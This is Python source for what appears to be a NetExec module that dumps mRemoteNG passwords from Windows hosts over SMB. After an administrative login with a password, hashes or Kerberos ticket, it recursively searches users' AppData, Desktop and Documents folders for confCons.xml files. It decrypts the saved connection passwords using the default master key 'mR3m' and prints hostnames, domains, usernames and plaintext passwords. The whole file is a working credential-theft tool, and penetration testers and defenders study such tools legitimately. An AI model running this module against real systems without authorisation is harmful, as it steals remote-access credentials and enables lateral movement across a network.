import ntpath
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from Cryptodome.Cipher import AES
from lxml import objectify
from base64 import b64decode
import hashlib
from dataclasses import dataclass


@dataclass
class MRemoteNgEncryptionAttributes:
    kdf_iterations: int
    block_cipher_mode: str
    encryption_engine: str
    full_file_encryption: bool

class NXCModule:
    """
    Dump mRemoteNG Passwords
    module by @_zblurx
    """

    name = "mremoteng"
    description = "Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) "
    supported_protocols = ["smb"]
    opsec_safe = True 
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.false_positive = (
            ".",
            "..",
            "desktop.ini",
            "Public",
            "Default",
            "Default User",
            "All Users",
        )

        self.mRemoteNg_path = [
            "Users\\{username}\\AppData\\Local\\mRemoteNG",
            "Users\\{username}\\AppData\\Roaming\\mRemoteNG",
            ]
        
        self.custom_user_path = [
            "Users\\{username}\\Desktop",
            "Users\\{username}\\Documents",
        ]

        self.recurse_max = 10

    def options(self, context, module_options):
        """
        SHARE           Share parsed. Default to C$
        PASSWORD        Custom password to decrypt confCons.xml files
        CUSTOM_PATH     Custom path to confCons.xml file
        """
        self.context = context
        
        self.password = "mR3m"
        if "PASSWORD" in module_options:
            self.password = module_options["PASSWORD"]

        self.custom_path = None
        if "CUSTOM_PATH" in module_options:
            self.custom_path = module_options["CUSTOM_PATH"]

    def on_admin_login(self, context, connection):
        # 1. Evole conn into dploot conn
        self.context = context
        self.connection = connection
        self.share = connection.args.share

        host = f"{connection.hostname}.{connection.domain}"
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        dploot_conn = self.upgrade_connection(target=target, connection=connection.conn)

        # 2. Dump users list
        users = self.get_users(dploot_conn)

        # 3. Search for mRemoteNG files
        for user in users:
            for path in self.mRemoteNg_path:
                user_path = ntpath.join(path.format(username=user), "confCons.xml")
                content = dploot_conn.readFile(self.share, user_path)
                if content is None:
                    continue
                self.context.log.info(f"Found confCons.xml file: {user_path}")
                self.handle_confCons_file(content)
            for path in self.custom_user_path:
                user_path = path.format(username=user)
                self.dig_confCons_in_files(conn=dploot_conn, directory_path=user_path, recurse_level=0, recurse_max=self.recurse_max)
        if self.custom_path is not None:
            content = dploot_conn.readFile(self.share, self.custom_path)
            if content is not None:
                self.context.log.info(f"Found confCons.xml file: {self.custom_path}")
                self.handle_confCons_file(content)

    def upgrade_connection(self, target: Target, connection=None):
        conn = DPLootSMBConnection(target)
        if connection is not None:
            conn.smb_session = connection
        else:
            conn.connect()
        return conn
    
    def get_users(self, conn):
        users = []

        users_dir_path = "Users\\*"
        directories = conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))

        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())  # noqa: PERF401, ignoring for readability
        return users
    
    def handle_confCons_file(self, file_content):
        main = objectify.fromstring(file_content)
        encryption_attributes = MRemoteNgEncryptionAttributes(
            kdf_iterations=int(main.attrib["KdfIterations"]),
            block_cipher_mode=main.attrib["BlockCipherMode"],
            encryption_engine=main.attrib["EncryptionEngine"],
            full_file_encryption=bool(main.attrib["FullFileEncryption"]),
        )
        
        for node_attribute in self.parse_xml_nodes(main):
            password = self.extract_remoteng_passwords(node_attribute["Password"], encryption_attributes)
            if password == b"":
                continue
            name = node_attribute["Name"]
            hostname = node_attribute["Hostname"]
            domain = node_attribute["Domain"] if node_attribute["Domain"] != "" else node_attribute["Hostname"]
            username = node_attribute["Username"]
            protocol = node_attribute["Protocol"]
            port = node_attribute["Port"]
            host = f" {protocol}://{hostname}:{port}" if node_attribute["Hostname"] != "" else " " 
            self.context.log.highlight(f"{name}:{host} - {domain}\\{username}:{password}")

    def parse_xml_nodes(self, main):
        nodes = []
        for node in list(main.getchildren()):
            node_attributes = node.attrib
            if node_attributes["Type"] == "Connection":
                nodes.append(node.attrib)
            elif node_attributes["Type"] == "Container":
                nodes.append(node.attrib)
                nodes = nodes + self.parse_xml_nodes(node)
        return nodes
    
    def dig_confCons_in_files(self, conn, directory_path, recurse_level=0, recurse_max=10):
        directory_list = conn.remote_list_dir(self.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    new_path = ntpath.join(directory_path, item.get_longname())
                    if item.is_directory() > 0:
                        if recurse_level < recurse_max:
                            self.dig_confCons_in_files(conn=conn, directory_path=new_path, recurse_level=recurse_level + 1, recurse_max=recurse_max)
                    else:
                        # It's a file, download it to the output share if the mask is ok
                        if "confCons.xml" in item.get_longname():
                            self.context.log.info(f"Found confCons.xml file: {new_path}")
                            content = conn.readFile(self.context.share, new_path)
                            self.handle_confCons_file(content)
                            

    def extract_remoteng_passwords(self, encrypted_password, encryption_attributes: MRemoteNgEncryptionAttributes):
        encrypted_password = b64decode(encrypted_password)
        if encrypted_password == b"":
            return encrypted_password

        if encryption_attributes.encryption_engine == "AES":
            salt = encrypted_password[:16]
            associated_data = encrypted_password[:16]
            nonce = encrypted_password[16:32]
            ciphertext = encrypted_password[32:-16]
            tag = encrypted_password[-16:]
            key = hashlib.pbkdf2_hmac("sha1", self.password.encode(), salt, encryption_attributes.kdf_iterations, dklen=32)
            if encryption_attributes.block_cipher_mode == "GCM":
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            elif encryption_attributes.block_cipher_mode == "CCM":
                cipher = AES.new(key, AES.MODE_CCM, nonce=nonce)
            elif encryption_attributes.block_cipher_mode == "EAX":
                cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            else:
                self.context.log.debug(f"Could not decrypt MRemoteNG password with encryption algorithm {encryption_attributes.encryption_engine}-{encryption_attributes.block_cipher_mode}: Not yet implemented")
            cipher.update(associated_data)
            return cipher.decrypt_and_verify(ciphertext, tag).decode("latin-1")
        else:
            self.context.log.debug(f"Could not decrypt MRemoteNG password with encryption algorithm {encryption_attributes.encryption_engine}: Not yet implemented")